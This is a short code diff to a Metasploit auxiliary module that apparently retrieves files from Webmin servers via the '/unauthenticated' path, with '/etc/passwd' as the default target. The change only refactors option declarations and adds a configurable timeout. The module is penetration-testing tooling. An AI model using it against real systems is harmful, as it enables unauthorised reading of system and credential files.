@@ -43,21 +43,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(10000),
-        OptString.new('RPATH',
-          [
-            true,
-            "The file to download",
-            "/etc/passwd"
-          ]
-        ),
-        OptString.new('DIR',
-          [
-            true,
-            "Webmin directory path",
-            "/unauthenticated"
-          ]
-        ),
+        OptString.new('RPATH', [ true, "The file to download", "/etc/passwd" ]),
+        OptString.new('DIR', [ true, "Webmin directory path", "/unauthenticated" ]),
+        OptInt.new('TIMEOUT', [ true, "The timeout in seconds waiting for the server response", 10 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT']
   end
 
   def run
@@ -68,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_raw({
       'uri'            => uri,
-    }, 10)
+    }, timeout)
 
     if (res)
       print_status("The server returned: #{res.code} #{res.message}")
